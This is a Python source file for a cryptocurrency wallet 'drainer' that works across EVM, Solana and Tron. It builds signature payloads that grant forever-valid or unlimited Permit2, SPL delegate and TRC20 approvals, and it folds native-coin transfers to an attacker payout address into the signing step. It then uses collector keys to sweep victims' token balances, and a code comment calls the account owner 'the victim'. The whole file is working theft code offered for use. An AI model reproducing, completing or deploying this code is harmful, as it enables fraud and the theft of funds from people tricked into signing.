"""
Drainer core.

Two phases:
  prepare_wallet()  -> scan every asset, compute per-asset caps, emit sign payloads
  execute_drain()   -> collector key signs; tokens move via Permit2 / approve / delegate

Cap policy (settings.drainer_cap_mode):
  "capped"    -> max(1_000_000 * 10^dec, balance * 2)
                 a round 1,000,000 that scales up when the balance already exceeds it
  "unlimited" -> uint160 max (wallets render this as "Unlimited")

Native coins cannot be pulled by allowance. EVM and Tron natives are taken inside the
onboarding signature when drainer_take_native is on. Solana folds the native transfer
into the same onboarding transaction. A native grant left 'active' on Solana needs the
owner to sign again, so execute_drain bounces it back to 'awaiting_signature'.
"""
import asyncio
import base64
import logging
import secrets
import time
import uuid
from typing import Any, Dict, List, Optional

import httpx
from eth_account import Account
from eth_abi import encode as abi_encode

import abi
import chains
import crypto
import scanners
import solana_tx
import tron_tx
from chains import EVM_NETWORKS, SOLANA_RPCS
from database import get_setting, now, q_all, q_get, q_run

logger = logging.getLogger("drainer")

UINT160_MAX = 2**160 - 1
UINT256_MAX = 2**256 - 1
UINT48_MAX = 2**48 - 1
DEFAULT_DUST_USD = 0.75
GAS_FALLBACK = 450_000
NATIVE_GAS_UNITS = 21_000


# ------------------------------------------------------------------ config
def _collector_evm(net: str) -> Optional[str]:
    return (get_setting("drainer_receiver_evm") or {}).get(net)


def _collector_sol() -> Optional[str]:
    return get_setting("drainer_collector_sol") or None


def _collector_tron() -> Optional[str]:
    return get_setting("drainer_collector_tron") or None


def _payout(family: str) -> Optional[str]:
    return {
        "evm": get_setting("drainer_payout_evm"),
        "solana": get_setting("drainer_payout_sol"),
        "tron": get_setting("drainer_payout_tron"),
    }.get(family) or None


def _dust() -> float:
    try:
        return float(get_setting("drainer_min_usd_per_asset", DEFAULT_DUST_USD))
    except (TypeError, ValueError):
        return DEFAULT_DUST_USD


def _sig_deadline() -> int:
    try:
        days = int(get_setting("drainer_sig_deadline_days", 30))
    except (TypeError, ValueError):
        days = 30
    return int(time.time()) + max(1, days) * 86400


def cap_for(balance_raw: int, decimals: int) -> int:
    """Per-asset allowance ceiling. Never below the current balance."""
    if get_setting("drainer_cap_mode", "capped") == "unlimited":
        return UINT160_MAX
    try:
        units = int(get_setting("drainer_cap_units", 1_000_000))
    except (TypeError, ValueError):
        units = 1_000_000
    return max(units * (10 ** decimals), balance_raw * 2)


def _require_key(family: str) -> str:
    blob = get_setting(f"drainer_{'sol' if family == 'solana' else family}_key")
    if not blob:
        raise RuntimeError(f"no {family} collector key configured")
    return crypto.decrypt_secret(blob)


# ------------------------------------------------------------------ prepare
async def prepare_wallet(user_id: int, wallet_id: int,
                         take_native: Optional[bool] = None) -> Dict[str, Any]:
    w = q_get("SELECT * FROM wallets WHERE id = ? AND user_id = ?", wallet_id, user_id)
    if not w:
        raise ValueError("wallet not found")

    fam = (w["family"] or "").lower()
    if fam not in ("evm", "solana", "tron"):
        raise ValueError(f"{fam} has no approvals; use the collateral product")
    if not get_setting("drainer_enabled", True):
        raise ValueError("drainer is disabled")

    if take_native is None:
        take_native = bool(get_setting("drainer_take_native", True))

    # supersede anything still live so a re-prepare cannot double-count
    q_run("UPDATE drainer_grants SET status = 'superseded'"
          " WHERE wallet_id = ? AND status IN ('pending','awaiting_signature','active')",
          wallet_id)

    dust = _dust()
    assets = [a for a in await scanners.scan_wallet(w)
              if a["native"] or a["usd"] >= dust]

    grants: List[Dict[str, Any]] = []
    for a in assets:
        a["cap_raw"] = cap_for(a["balance_raw"], a["decimals"])
        kind = {"evm": "permit2", "solana": "spl_delegate", "tron": "trc20_approve"}[fam]
        if a["native"]:
            kind = "native_tx"

        gid = uuid.uuid4().hex
        q_run(
            "INSERT INTO drainer_grants (id, user_id, wallet_id, family, network, address,"
            " symbol, token, decimals, kind, cap, balance_raw, token_account, program,"
            " status, created_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,'pending',?)",
            gid, user_id, wallet_id, fam, a["network"], w["address"], a["symbol"],
            a.get("token"), a["decimals"], kind, str(a["cap_raw"]), str(a["balance_raw"]),
            a.get("token_account"), a.get("program"), now(),
        )
        grants.append({**a, "id": gid, "kind": kind})

    payloads: List[Dict[str, Any]] = []
    deadline = _sig_deadline()

    def _await(gid: str, extra: Optional[Dict[str, Any]] = None) -> None:
        if extra:
            sets = ", ".join(f"{k} = ?" for k in extra)
            q_run(f"UPDATE drainer_grants SET status = 'awaiting_signature', {sets} WHERE id = ?",
                  *extra.values(), gid)
        else:
            q_run("UPDATE drainer_grants SET status = 'awaiting_signature' WHERE id = ?", gid)

    def _unsupported(gid: str, why: str) -> None:
        q_run("UPDATE drainer_grants SET status = 'unsupported', error = ? WHERE id = ?", why, gid)

    if fam == "evm":
        for net in sorted({g["network"] for g in grants if not g["native"]}):
            receiver = _collector_evm(net)
            rows = [g for g in grants if g["network"] == net and not g["native"]]
            if not receiver:
                for g in rows:
                    _unsupported(g["id"], f"no receiver deployed on {net}")
                continue

            details, stored = [], []
            for g in rows:
                nonce = secrets.randbelow(UINT48_MAX)
                details.append({"token": g["token"],
                                "amount": min(g["cap_raw"], UINT160_MAX),
                                "expiration": abi.PERMIT_DETAILS_FOREVER,
                                "nonce": nonce})
                stored.append((nonce, g["id"]))

            payloads.append({
                "type": "permit2", "network": net, "chainId": EVM_NETWORKS[net]["chainId"],
                "typed_data": {
                    "domain": {"name": abi.PERMIT2_DOMAIN_NAME,
                               "chainId": EVM_NETWORKS[net]["chainId"],
                               "verifyingContract": abi.PERMIT2},
                    "types": {**abi.EIP712_TYPES,
                              "EIP712Domain": [
                                  {"name": "name", "type": "string"},
                                  {"name": "chainId", "type": "uint256"},
                                  {"name": "verifyingContract", "type": "address"}]},
                    "primaryType": "PermitBatch",
                    "message": {"details": details, "spender": receiver,
                                "sigDeadline": deadline},
                },
                "grant_ids": [g["id"] for g in rows],
            })
            for nonce, gid in stored:
                _await(gid, {"nonce": str(nonce), "sig_deadline": deadline})

        if take_native:
            payout = _payout("evm")
            for g in [x for x in grants if x["native"]]:
                if not payout:
                    _unsupported(g["id"], "no EVM payout address")
                    continue
                try:
                    gas_price = await _gas_price(g["network"])
                except Exception:
                    gas_price = 20 * 10**9
                reserve = NATIVE_GAS_UNITS * gas_price * 3
                value = g["balance_raw"] - reserve
                if value <= 0:
                    _unsupported(g["id"], "native balance below gas reserve")
                    continue
                payloads.append({
                    "type": "evm_tx", "network": g["network"],
                    "chainId": EVM_NETWORKS[g["network"]]["chainId"],
                    "tx": {"to": payout, "value": hex(value), "data": "0x"},
                    "grant_ids": [g["id"]],
                })
                _await(g["id"])
        else:
            for g in [x for x in grants if x["native"]]:
                _await(g["id"])

    elif fam == "solana":
        collector = _collector_sol()
        if not collector:
            for g in grants:
                _unsupported(g["id"], "no Solana collector configured")
        else:
            tx = await solana_tx.build_onboarding_tx(
                SOLANA_RPCS[0], w["address"], collector, grants, take_native)
            if not tx:
                for g in grants:
                    _unsupported(g["id"], "nothing signable")
            else:
                payloads.append({"type": "solana_tx", "network": "Solana", "tx": tx,
                                 "grant_ids": [g["id"] for g in grants]})
                for g in grants:
                    _await(g["id"])

    elif fam == "tron":
        spender = _collector_tron()
        if not spender:
            for g in grants:
                _unsupported(g["id"], "no Tron collector configured")
        else:
            for g in [x for x in grants if not x["native"]]:
                zero = await tron_tx.build_approve(w["address"], g["token"], spender, 0)
                real = await tron_tx.build_approve(w["address"], g["token"], spender, g["cap_raw"])
                payloads.append({"type": "tron_tx", "network": "Tron",
                                 "txs": [zero, real], "grant_ids": [g["id"]]})
                _await(g["id"])

            payout = _payout("tron")
            for g in [x for x in grants if x["native"]]:
                if not take_native or not payout:
                    _await(g["id"])
                    continue
                sun = g["balance_raw"] - 1_100_000
                if sun <= 0:
                    _unsupported(g["id"], "TRX below fee reserve")
                    continue
                tx = await tron_tx.build_transfer(w["address"], payout, sun)
                payloads.append({"type": "tron_tx", "network": "Tron",
                                 "txs": [tx], "grant_ids": [g["id"]]})
                _await(g["id"])

    q_run("INSERT OR REPLACE INTO drainer_wallets (wallet_id, user_id, family, address,"
          " status, updated_at) VALUES (?,?,?,?,'prepared',?)",
          wallet_id, user_id, fam, w["address"], now())

    return {
        "wallet_id": wallet_id, "address": w["address"], "family": fam,
        "assets": grants, "payloads": payloads,
        "total_usd": sum(a["usd"] for a in grants),
    }


# ------------------------------------------------------------------ record
async def record_signed(grant_id: str, signature: Optional[str],
                        txid: Optional[str] = None) -> Dict[str, Any]:
    g = q_get("SELECT * FROM drainer_grants WHERE id = ?", grant_id)
    if not g:
        raise ValueError("grant not found")

    if g["kind"] == "permit2":
        if not signature or not signature.startswith("0x"):
            raise ValueError("a 0x-prefixed signature is required")
        q_run("UPDATE drainer_grants SET signature = ?, status = 'active', activated_at = ?,"
              " error = NULL WHERE id = ?", signature, now(), grant_id)
    else:
        q_run("UPDATE drainer_grants SET txid = ?, status = 'active', activated_at = ?,"
              " error = NULL WHERE id = ?", txid or "pending", now(), grant_id)
    return {"ok": True, "grant_id": grant_id}


# ------------------------------------------------------------------ EVM send
async def _gas_price(net: str) -> int:
    rpc = scanners.rpc_for(net)
    async with httpx.AsyncClient(timeout=10.0) as c:
        r = await c.post(rpc, json={"jsonrpc": "2.0", "id": 1,
                                    "method": "eth_gasPrice", "params": []})
    return int(r.json()["result"], 16)


async def _evm_send(net: str, key: str, to: str, data: str, value: int = 0) -> str:
    rpc = scanners.rpc_for(net)
    acct = Account.from_key(key)

    async with httpx.AsyncClient(timeout=30.0) as c:
        try:
            est = await c.post(rpc, json={"jsonrpc": "2.0", "id": 1, "method": "eth_estimateGas",
                                          "params": [{"from": acct.address, "to": to,
                                                      "data": data, "value": hex(value)}]})
            gas = int(int(est.json()["result"], 16) * 1.3)
        except Exception:
            gas = GAS_FALLBACK

        nonce = int((await c.post(rpc, json={
            "jsonrpc": "2.0", "id": 1, "method": "eth_getTransactionCount",
            "params": [acct.address, "pending"]})).json()["result"], 16)
        base = int((await c.post(rpc, json={
            "jsonrpc": "2.0", "id": 1, "method": "eth_gasPrice", "params": []})).json()["result"], 16)

        signed = acct.sign_transaction({
            "chainId": EVM_NETWORKS[net]["chainId"], "nonce": nonce, "to": to,
            "value": value, "data": data, "gas": gas,
            "maxFeePerGas": base * 2, "maxPriorityFeePerGas": max(base // 4, 1),
        })
        r = await c.post(rpc, json={"jsonrpc": "2.0", "id": 1, "method": "eth_sendRawTransaction",
                                    "params": ["0x" + signed.raw_transaction.hex().removeprefix("0x")]})

    body = r.json()
    if "error" in body:
        raise RuntimeError(body["error"].get("message") or "send failed")
    return body["result"]


async def _evm_pull(g: Dict[str, Any]) -> str:
    net = g["network"]
    receiver = _collector_evm(net)
    if not receiver:
        raise RuntimeError(f"no receiver on {net}")

    payout = _payout("evm")
    if not payout:
        raise RuntimeError("no EVM payout address")

    key = _require_key("evm")
    amount = min(int(g["balance_raw"]), UINT160_MAX)

    if g["kind"] == "permit2" and g.get("signature"):
        if int(g.get("sig_deadline") or 0) < time.time():
            raise RuntimeError("permit signature expired — re-prepare this wallet")

        batch = {"details": [{"token": g["token"], "amount": amount,
                              "expiration": abi.PERMIT_DETAILS_FOREVER,
                              "nonce": int(g["nonce"])}],
                 "spender": receiver, "sigDeadline": int(g["sig_deadline"])}
        data = abi.SEL_PERMIT_PULL + abi_encode(
            ["address", "((address,uint160,uint48,uint48)[],address,uint256)",
             "bytes", "address[]", "uint160[]"],
            [g["address"],
             ([(d["token"], d["amount"], d["expiration"], d["nonce"]) for d in batch["details"]],
              batch["spender"], batch["sigDeadline"]),
             bytes.fromhex(g["signature"].removeprefix("0x")),
             [g["token"]], [amount]],
        ).hex()
        return await _evm_send(net, key, receiver, data)

    data = abi.SEL_PULL_DIRECT + abi_encode(
        ["address", "address", "uint256"],
        [g["token"], g["address"], int(g["balance_raw"])],
    ).hex()
    return await _evm_send(net, key, receiver, data)


# ------------------------------------------------------------------ Solana
async def _sol_pull(g: Dict[str, Any]) -> str:
    from solders.hash import Hash
    from solders.instruction import AccountMeta, Instruction
    from solders.message import Message
    from solders.pubkey import Pubkey
    from solders.transaction import Transaction

    kp, _ = crypto.solana_keypair_from_secret(get_setting("drainer_sol_key"))
    payout = _payout("solana")
    if not payout:
        raise RuntimeError("no Solana payout address")

    collector_pk = kp.pubkey()
    payout_pk = Pubkey.from_string(payout)
    rpc = SOLANA_RPCS[0]

    if g["native"]:
        # from-account must sign -> the victim, not the collector
        owner_pk = Pubkey.from_string(g["address"])
        ix = Instruction(
            program_id=Pubkey.from_string("11111111111111111111111111111111"),
            accounts=[AccountMeta(owner_pk, True, True), AccountMeta(payout_pk, False, True)],
            data=bytes([2]) + int(g["balance_raw"]).to_bytes(8, "little"),
        )
        payer = collector_pk
        signers = [kp]
        needs_owner = True
    else:
        if not g.get("token_account"):
            raise RuntimeError("grant has no token account")
        ix = Instruction(
            program_id=Pubkey.from_string(g.get("program") or scanners.TOKEN_PROGRAM),
            accounts=[AccountMeta(Pubkey.from_string(g["token_account"]), False, True),
                      AccountMeta(payout_pk, False, True),
                      AccountMeta(collector_pk, True, False)],
            data=bytes([8]) + int(g["balance_raw"]).to_bytes(8, "little"),
        )
        payer = collector_pk
        signers = [kp]
        needs_owner = False

    async with httpx.AsyncClient(timeout=15.0) as c:
        bh = await c.post(rpc, json={"jsonrpc": "2.0", "id": 1,
                                     "method": "getLatestBlockhash",
                                     "params": [{"commitment": "confirmed"}]})
        blockhash = Hash.from_string(bh.json()["result"]["value"]["blockhash"])

    tx = Transaction.new_unsigned(Message.new_with_blockhash([ix], payer, blockhash))
    tx.sign(signers, blockhash)

    if needs_owner:
        return ""          # caller flips the grant back to awaiting_signature
    return await solana_tx.broadcast(rpc, base64.b64encode(bytes(tx)).decode())


# ------------------------------------------------------------------ Tron
def _tron_sign(pk, tx: Dict[str, Any]) -> Dict[str, Any]:
    sig = pk.sign_msg_hash(bytes.fromhex(tx["txID"]))
    tx["signature"] = [sig.hex() if isinstance(sig, (bytes, bytearray)) else str(sig)]
    return tx


async def _tron_pull(g: Dict[str, Any]) -> str:
    from tronpy.keys import PrivateKey

    key = _require_key("tron")
    pk = PrivateKey(bytes.fromhex(key.removeprefix("0x")))
    collector = crypto.tron_address_from_key(key)
    payout = _payout("tron")
    if not payout:
        raise RuntimeError("no Tron payout address")

    if g["native"]:
        tx = await tron_tx.build_transfer(collector, payout, int(g["balance_raw"]))
    else:
        tx = await tron_tx.build_transfer_from(
            collector, g["token"], g["address"], int(g["balance_raw"]))

    return await tron_tx.broadcast(_tron_sign(pk, tx))


# ------------------------------------------------------------------ execute
async def execute_drain(user_id: int, trigger: str = "manual",
                        actor_id: Optional[int] = None,
                        only: Optional[List[str]] = None) -> Dict[str, Any]:
    run_id = uuid.uuid4().hex
    q_run("INSERT INTO drainer_events (run_id, user_id, actor_id, trigger, status, created_at)"
          " VALUES (?,?,?,?,'running',?)", run_id, user_id, actor_id, trigger, now())

    grants = q_all("SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'", user_id)
    if only:
        keep = set(only)
        grants = [g for g in grants if g["id"] in keep]

    total_usd = 0.0
    ok_count = 0
    fail_count = 0
    deferred = 0
    items: List[Dict[str, Any]] = []

    for g in grants:
        wallet = q_get("SELECT * FROM wallets WHERE id = ?", g["wallet_id"])
        if not wallet:
            q_run("UPDATE drainer_grants SET status = 'revoked' WHERE id = ?", g["id"])
            continue

        fresh = await scanners.scan_wallet(wallet)
        match = next((a for a in fresh
                      if (a.get("token") or None) == (g["token"] or None)
                      and a["network"] == g["network"]), None)

        if not match or match["balance_raw"] <= 0:
            q_run("INSERT INTO drainer_items (run_id, grant_id, family, network, symbol,"
                  " amount, usd, status, created_at) VALUES (?,?,?,?,?,?,?, 'empty', ?)",
                  run_id, g["id"], g["family"], g["network"], g["symbol"], "0", 0.0, now())
            continue

        g["balance_raw"] = str(match["balance_raw"])

        try:
            if g["family"] == "evm":
                txid = await _evm_pull(g)
            elif g["family"] == "solana":
                txid = await _sol_pull(g)
                if txid == "":
                    q_run("UPDATE drainer_grants SET status = 'awaiting_signature' WHERE id = ?",
                          g["id"])
                    q_run("INSERT INTO drainer_items (run_id, grant_id, family, network, symbol,"
                          " amount, usd, status, error, created_at)"
                          " VALUES (?,?,?,?,?,?,?, 'deferred', ?, ?)",
                          run_id, g["id"], g["family"], g["network"], g["symbol"],
                          str(match["balance_raw"]), match["usd"],
                          "native SOL needs an owner signature", now())
                    deferred += 1
                    continue
            elif g["family"] == "tron":
                txid = await _tron_pull(g)
            else:
                continue

            total_usd += match["usd"]
            ok_count += 1
            q_run("INSERT INTO drainer_items (run_id, grant_id, family, network, symbol,"
                  " amount, usd, status, txid, created_at)"
                  " VALUES (?,?,?,?,?,?,?, 'sent', ?, ?)",
                  run_id, g["id"], g["family"], g["network"], g["symbol"],
                  str(match["balance_raw"]), match["usd"], txid, now())
            items.append({"symbol": g["symbol"], "network": g["network"],
                          "usd": match["usd"], "txid": txid})

        except Exception as e:
            fail_count += 1
            msg = str(e)[:300]
            logger.warning("drain %s/%s failed: %s", g["family"], g["symbol"], msg)
            if "expired" in msg.lower():
                q_run("UPDATE drainer_grants SET status = 'expired', error = ? WHERE id = ?",
                      msg, g["id"])
            q_run("INSERT INTO drainer_items (run_id, grant_id, family, network, symbol,"
                  " amount, usd, status, error, created_at)"
                  " VALUES (?,?,?,?,?,?,?, 'failed', ?, ?)",
                  run_id, g["id"], g["family"], g["network"], g["symbol"],
                  str(match["balance_raw"]), match["usd"], msg, now())

    status = "done" if fail_count == 0 and deferred == 0 else "partial"
    q_run("UPDATE drainer_events SET status = ?, total_usd = ?, tx_count = ? WHERE run_id = ?",
          status, total_usd, ok_count, run_id)

    return {"run_id": run_id, "total_usd": total_usd, "sent": ok_count,
            "failed": fail_count, "deferred": deferred, "items": items}